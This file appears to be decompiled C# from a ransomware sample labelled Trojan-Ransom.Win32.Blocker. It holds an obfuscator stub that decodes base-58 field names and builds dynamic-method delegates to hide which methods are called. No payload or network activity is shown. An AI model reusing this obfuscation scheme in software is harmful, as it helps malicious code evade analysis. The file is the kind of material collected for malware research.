// Decompiled with JetBrains decompiler
// Type: ?4?.?3?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 601E9F23-A239-4CA4-BCF6-5BB65F85A0DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.biqw-00a129d49d9d6af2a869f53ab2db7d80f4313e2b391d30ed8e02a96f59aa0cb4.exe

using \u003F4\u003F;
using \u003F8\u003F;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u003F4\u003F
{
  [\u003F8\u003F.\u003F8\u003F]
  [\u003F1\u003F]
  internal static class \u003F3\u003F
  {
    private static ModuleHandle \u003F8\u003F;
    private static char[] \u003F8\u003F = new char[58]
    {
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\a',
      '\b',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
      '\u007F',
      '\u0080',
      '\u0081',
      '\u0082',
      '\u0083',
      '\u0084',
      '\u0086',
      '\u0087',
      '\u0088',
      '\u0089',
      '\u008A',
      '\u008B',
      '\u008C',
      '\u008D',
      '\u008E',
      '\u008F',
      '\u0090',
      '\u0091',
      '\u0092',
      '\u0093',
      '\u0094',
      '\u0095',
      '\u0096',
      '\u0097',
      '\u0098',
      '\u0099',
      '\u009A',
      '\u009B',
      '\u009C',
      '\u009D',
      '\u009E',
      '\u009F'
    };

    [\u003F8\u003F.\u003F8\u003F]
    [\u003F1\u003F]
    public static void \u003F8\u003F([In] int obj0)
    {
      Type typeFromHandle;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(\u003F3\u003F.\u003F8\u003F.ResolveTypeHandle(33554433 + obj0));
      }
      catch
      {
        return;
      }
      if (true)
        goto label_46;
label_38:
      bool flag;
      MethodInfo methodFromHandle;
      ILGenerator ilGenerator;
      ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
      ilGenerator.Emit(OpCodes.Ret);
      Delegate @delegate;
      DynamicMethod dynamicMethod;
      try
      {
        @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
      }
      catch
      {
        goto label_43;
      }
label_41:
      FieldInfo fieldInfo;
      try
      {
        fieldInfo.SetValue((object) null, (object) @delegate);
      }
      catch
      {
      }
label_43:
      int index1;
      ++index1;
label_44:
      FieldInfo[] fields;
      if (index1 >= fields.Length)
        return;
      fieldInfo = fields[index1];
      string name = fieldInfo.Name;
      flag = false;
      int num1 = 0;
      int index2 = name.Length - 1;
      while (true)
      {
        char ch;
        int index3;
        if (index2 >= 0)
        {
          ch = name[index2];
          if (ch == '~')
          {
            flag = true;
            goto label_15;
          }
          else
          {
            index3 = 0;
            goto label_11;
          }
        }
        else
          goto label_15;
label_8:
        num1 = num1 * 58 + index3;
        goto label_13;
label_11:
        int num2 = index3;
        int num3 = 58;
label_12:
        int num4;
        for (; num2 < num3; num2 = num4)
        {
          num4 = (int) \u003F3\u003F.\u003F8\u003F[index3];
          int num5 = (int) ch;
          if (true)
          {
            if (num4 != num5)
            {
              if (true)
              {
                ++index3;
                goto label_11;
              }
              else
                goto label_20;
            }
            else
              goto label_8;
          }
          else
            num3 = num5;
        }
label_13:
        --index2;
        continue;
label_15:
        try
        {
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u003F3\u003F.\u003F8\u003F.ResolveMethodHandle(num1 + 167772161));
        }
        catch
        {
          goto label_43;
        }
        if (methodFromHandle.IsStatic)
          break;
label_20:
        ParameterInfo[] parameters = methodFromHandle.GetParameters();
        int length1 = parameters.Length;
        int num6 = 1;
        if (num6 == 0)
        {
          num3 = num6;
          num2 = length1;
          goto label_12;
        }
        else
        {
          int length2 = length1 + num6;
          Type[] parameterTypes = new Type[length2];
          parameterTypes[0] = typeof (object);
          int index4 = 1;
          while (true)
          {
            if (index4 < length2)
            {
              parameterTypes[index4] = parameters[index4 - 1].ParameterType;
              ++index4;
            }
            else
            {
              dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
              ilGenerator = dynamicMethod.GetILGenerator();
              ilGenerator.Emit(OpCodes.Ldarg_0);
              if (length2 > 1)
              {
                if (true)
                  ilGenerator.Emit(OpCodes.Ldarg_1);
                else
                  break;
              }
              int num7 = length2;
label_29:
              if (num7 > 2)
                ilGenerator.Emit(OpCodes.Ldarg_2);
              if (length2 > 3)
                ilGenerator.Emit(OpCodes.Ldarg_3);
              if (length2 > 4)
              {
                int num8;
                for (int index5 = 4; index5 < length2; index5 = num8 + 1)
                {
                  ilGenerator.Emit(OpCodes.Ldarg_S, index5);
                  num8 = index5;
                  if (false)
                  {
                    num7 = num8;
                    goto label_29;
                  }
                }
                goto label_38;
              }
              else
                goto label_38;
            }
          }
          goto label_8;
        }
      }
      try
      {
        @delegate = Delegate.CreateDelegate(fieldInfo.FieldType, methodFromHandle);
        goto label_41;
      }
      catch (Exception ex)
      {
        goto label_43;
      }
label_46:
      fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
      if (true)
      {
        index1 = 0;
        goto label_44;
      }
      else
        goto label_44;
    }

    static \u003F3\u003F()
    {
      do
      {
        if (true)
          goto label_5;
label_2:
        Type type;
        if ((object) type != null)
          goto label_4;
label_3:
        continue;
label_4:
        \u003F3\u003F.\u003F8\u003F = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
        goto label_3;
label_5:
        type = typeof (MulticastDelegate);
        goto label_2;
      }
      while (false);
    }
  }
}
